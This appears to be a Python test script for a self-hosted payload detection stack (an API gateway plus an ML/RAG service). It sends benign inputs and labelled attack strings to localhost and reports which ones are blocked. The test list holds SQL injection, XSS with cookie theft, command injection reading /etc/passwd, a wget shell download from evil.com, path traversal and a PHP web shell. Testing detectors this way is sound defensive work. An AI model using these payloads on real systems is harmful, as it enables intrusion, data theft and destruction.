#!/usr/bin/env python3
"""
Comprehensive test script for the deployed API Gateway and Enhanced Payload Detection System.
Tests the complete stack: API Gateway -> RAG Service -> Enhanced ML Models -> Vector DB -> Gemini Analysis
"""

import requests
import json
import time
from typing import Dict, List

class APIGatewayTester:
    def __init__(self, gateway_url: str = "http://localhost:9000", rag_url: str = "http://localhost:8000"):
        self.gateway_url = gateway_url
        self.rag_url = rag_url
        
    def test_gateway_health(self):
        """Test API Gateway health."""
        try:
            response = requests.get(f"{self.gateway_url}/health", timeout=5)
            print(f"🏥 API Gateway Health: {response.status_code}")
            if response.status_code == 200:
                print(f"   ✅ Response: {response.json()}")
            else:
                print(f"   ⚠️  Response: {response.text[:200]}")
        except Exception as e:
            print(f"   ❌ Error: {e}")
    
    def test_rag_health(self):
        """Test RAG Service health."""
        try:
            response = requests.get(f"{self.rag_url}/health", timeout=5)
            print(f"🤖 RAG Service Health: {response.status_code}")
            if response.status_code == 200:
                result = response.json()
                print(f"   📊 Status: {result.get('status', 'unknown')}")
                print(f"   🔧 Analysis Mode: {result.get('analysis_mode', 'unknown')}")
                print(f"   🧠 RAG Pipeline: {'✅' if result.get('rag_pipeline_available') else '❌'}")
                print(f"   🤖 Agents: {'✅' if result.get('cyber_orchestrator_initialized') else '❌'}")
            else:
                print(f"   ⚠️  Response: {response.text[:200]}")
        except Exception as e:
            print(f"   ❌ Error: {e}")
    
    def test_payload_inspection(self, payload: str, source: str = "test") -> Dict:
        """Test payload through API Gateway inspection."""
        try:
            data = {"payload": payload, "source": source}
            response = requests.post(f"{self.gateway_url}/inspect", json=data, timeout=10)
            return {
                "status_code": response.status_code,
                "response": response.json() if response.headers.get('content-type', '').startswith('application/json') else response.text,
                "blocked": response.status_code != 200
            }
        except Exception as e:
            return {"error": str(e), "blocked": True}
    
    def test_direct_rag_analysis(self, payload: str) -> Dict:
        """Test payload directly through RAG service."""
        try:
            data = {"payload": payload, "metadata": {"source": "direct_test"}}
            response = requests.post(f"{self.rag_url}/check_payload", json=data, timeout=15)
            return {
                "status_code": response.status_code,
                "response": response.json() if response.headers.get('content-type', '').startswith('application/json') else response.text
            }
        except Exception as e:
            return {"error": str(e)}
    
    def comprehensive_payload_test(self, payload: str, description: str):
        """Run comprehensive test on a payload."""
        print(f"\n{'='*80}")
        print(f"🧪 TESTING: {description}")
        print(f"📝 Payload: {payload}")
        print(f"{'='*80}")
        
        # Test through API Gateway
        print("🚪 API GATEWAY TEST:")
        gateway_result = self.test_payload_inspection(payload)
        if "error" in gateway_result:
            print(f"   ❌ Error: {gateway_result['error']}")
        else:
            print(f"   📊 Status: {gateway_result['status_code']}")
            print(f"   🛡️  Blocked: {'✅ YES' if gateway_result['blocked'] else '❌ NO'}")
            print(f"   📄 Response: {gateway_result['response']}")
        
        # Test direct RAG analysis
        print("\n🤖 RAG SERVICE DIRECT TEST:")
        rag_result = self.test_direct_rag_analysis(payload)
        if "error" in rag_result:
            print(f"   ❌ Error: {rag_result['error']}")
        else:
            print(f"   📊 Status: {rag_result['status_code']}")
            if isinstance(rag_result['response'], dict):
                response = rag_result['response']
                print(f"   🏷️  Verdict: {response.get('verdict', 'unknown')}")
                print(f"   📈 Confidence: {response.get('confidence_score', 0):.3f}")
                print(f"   🔍 Method: {response.get('analysis_method', 'unknown')}")
                threat_details = response.get('threat_details', {})
                if threat_details.get('attack_type'):
                    print(f"   ⚔️  Attack Type: {threat_details['attack_type']}")
                    print(f"   ⚠️  Severity: {threat_details['severity']}")
            else:
                print(f"   📄 Response: {rag_result['response']}")
        
        return {"gateway": gateway_result, "rag": rag_result}

def main():
    """Main testing function."""
    print("🚀 COMPREHENSIVE API GATEWAY & ENHANCED PAYLOAD DETECTION TEST")
    print("="*80)
    print("Testing the complete stack deployment:")
    print("• API Gateway (Port 9000) - Entry point with OWASP & Regex rules")
    print("• RAG Service (Port 8000) - Enhanced ML models + Vector DB + Gemini")
    print("• PostgreSQL Database - Incident logging and analysis storage")  
    print("• Nginx Reverse Proxy (Port 8080) - Production-ready load balancing")
    print("="*80)
    
    tester = APIGatewayTester()
    
    # Test service health
    print("\n🏥 HEALTH CHECKS:")
    tester.test_gateway_health()
    tester.test_rag_health()
    
    # Test payloads
    test_cases = [
        ("hello world", "Simple legitimate text"),
        ("user=john&pass=secret123", "Login form submission"),
        ("search=python programming", "Search query"),
        ("1' OR '1'='1", "Classic SQL injection"),
        ("admin'; DROP TABLE users; --", "Destructive SQL injection"),
        ("' UNION SELECT * FROM passwords --", "Data exfiltration SQL injection"),
        ("<script>alert('XSS')</script>", "Basic XSS attack"),
        ("javascript:alert(document.cookie)", "Cookie stealing XSS"),
        ("<img src=x onerror=alert('XSS')>", "Image-based XSS"),
        ("; ls -la", "Command injection"),
        ("| cat /etc/passwd", "File access command injection"),
        ("&& wget http://evil.com/shell.php", "Remote shell download"),
        ("../../../etc/passwd", "Path traversal attack"),
        ("....//....//etc/passwd", "Obfuscated path traversal"),
        ("<?php system($_GET['cmd']); ?>", "PHP web shell"),
    ]
    
    print(f"\n🧪 RUNNING {len(test_cases)} PAYLOAD TESTS:")
    
    results = []
    for payload, description in test_cases:
        result = tester.comprehensive_payload_test(payload, description)
        results.append((payload, description, result))
        time.sleep(1)  # Brief pause between tests
    
    # Summary
    print(f"\n{'='*80}")
    print("📊 TEST SUMMARY")
    print("="*80)
    
    gateway_blocked = 0
    rag_analyzed = 0
    
    for payload, desc, result in results:
        gateway_status = "BLOCKED" if result['gateway'].get('blocked') else "ALLOWED"
        rag_status = "ANALYZED" if 'error' not in result['rag'] else "ERROR"
        
        if result['gateway'].get('blocked'):
            gateway_blocked += 1
        if 'error' not in result['rag']:
            rag_analyzed += 1
            
        print(f"• {desc[:30]:<30} | Gateway: {gateway_status:<7} | RAG: {rag_status}")
    
    print(f"\n🛡️  PROTECTION SUMMARY:")
    print(f"   • API Gateway blocked: {gateway_blocked}/{len(test_cases)} payloads")
    print(f"   • RAG Service analyzed: {rag_analyzed}/{len(test_cases)} payloads")
    print(f"   • System Status: {'🟢 OPERATIONAL' if rag_analyzed > 0 else '🟡 DEGRADED'}")
    
    print(f"\n🎯 ENHANCED FEATURES:")
    print(f"   • ✅ All 441k+ payloads used for training (no duplicates removed)")
    print(f"   • ✅ Gemini AI analysis for legitimate payload understanding")
    print(f"   • ✅ Vector database storage for similarity-based detection")
    print(f"   • ✅ Multi-layer protection (Regex + OWASP + ML + AI)")
    print(f"   • ✅ Dockerized deployment with health monitoring")
    
    print(f"\n🔗 ACCESS POINTS:")
    print(f"   • API Gateway: http://localhost:9000")
    print(f"   • RAG Service: http://localhost:8000")
    print(f"   • Nginx Proxy: http://localhost:8080")
    print(f"   • PostgreSQL: localhost:5432")
    
    print("="*80)
    print("✅ COMPREHENSIVE TESTING COMPLETED!")
    print("🛡️  Enhanced payload detection system is operational with multi-layer security!")

if __name__ == "__main__":
    main()